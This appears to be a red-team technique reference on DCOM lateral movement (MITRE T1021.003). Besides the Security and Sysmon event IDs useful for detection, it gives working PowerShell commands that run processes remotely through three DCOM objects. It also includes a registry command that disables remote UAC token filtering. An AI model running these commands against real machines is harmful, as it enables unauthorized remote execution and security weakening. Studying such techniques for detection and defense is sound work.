Table of Contents
=================

* [DcomExec (Technique)](#dcomexec-technique)
   * [Summary](#summary)
   * [How it works (deeply)](#how-it-works-deeply)
   * [Requirements](#requirements)
   * [Logs](#logs)
      * [Security Logs](#security-logs)
      * [Sysmon Logs](#sysmon-logs)
   * [Remarks](#remarks)
   * [Implementations](#implementations)
   * [Links](#links)


DcomExec (Technique)
============

## Summary

Execute code via Distributed COM objects over RPC. It's possible to
throw and grab the output from a shared folder (`dcomexec.py` does
that).

- MMC20.Application (49B2791A-B1AE-4C90-9B8E-E860BA07F889)
- ShellWindows (9BA05972-F6A8-11CF-A442-00A0C90A8F39)
- ShellBrowserWindow (C08AFD90-F2A1-11D1-8455-00A0C91F3880)

## How it works (deeply)

...

## Requirements

1. RPC is running
	```bash
	Get-Service RpcSs,RpcEptMapper,DcomLaunch
	```

2. RPC and high ports are accessible (through firewall)

3. Administrator permissions on the target machine

4. Remote UAC (UAC Over network) disabled if the user chosen to
authenticate with is a **local user** and not a domain user
```bash
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
# Restart the 'Server' service might be required (I have tested twice on a Windows 10 and it **was not** required)
```

## Logs

#### Security Logs

- 4624, Logon event - Network Logon, Type 3
- 4672, Special Logon (If the user is Administrator)

#### Sysmon Logs

- 3, Network connection detected - from the "attacker" source IP

###### MMC20.Application
- 1, Process Create, mmc.exe creates the requested process

###### ShellWindows / ShellBrowserWindow
- 1, Process Create, explorer.exe creates the requested process


## Remarks

* The process running from ShellWindows runs under the 
`svchost.exe -k DcomLaunch` process.
* When using the ShellWindows and ShellBrowserWindow DCOM objects I 
couldn't find a way to redirect output to a file.
* While testing, impacket `dcomexec.py` sometimes wasn't working for
some reason while using pure Powershell did work.
* Permissions for DCOM objects can be managed from `dcomcnfg.exe`
* It's possible to enable/disable DCOM from the registry in the
following key and value:
	`HKLM\Software\Microsoft\Ole -> EnableDCOM`
* Except from the 3 DCOM objects displayed above, there are more DCOM
objects that can be used to execute remote commands in some way or
another but may require additional software on the target computer.
Some of them are explained [here](https://www.cybereason.com/blog/dcom-lateral-movement-techniques).


## Implementations

* [dcomexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py) (impacket)
* Powershell
	```bash
	# MMC20.Application
	$obj = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<TARGET_IP>"))
	$obj.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c hostname > c:\hostname.txt","7")

	# ShellWindows
	$obj = [System.Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39', "<TARGET_IP>"))
	$item = $obj.Item()
	$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)

	# ShellBrowserWindow
	$obj = [System.Activator]::CreateInstance([Type]::GetTypeFromCLSID('"C08AFD90-F2A1-11D1-8455-00A0C91F3880"', "<TARGET_IP>"))
	$obj.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)
	```
* [C#](https://gist.github.com/benpturner/1f2e3e7d7227b3a7e9740bba7a12fc2d)

## References

* https://www.cybereason.com/blog/dcom-lateral-movement-techniques
* https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
* https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/
* https://www.digitalwhisper.co.il/files/Zines/0x7B/DW123-6-DVS.pdf
* https://www.scorpiones.io/articles/lateral-movement-using-dcom-objects
* https://attack.mitre.org/techniques/T1021/003/
* https://github.com/ScorpionesLabs/DVS
* https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/
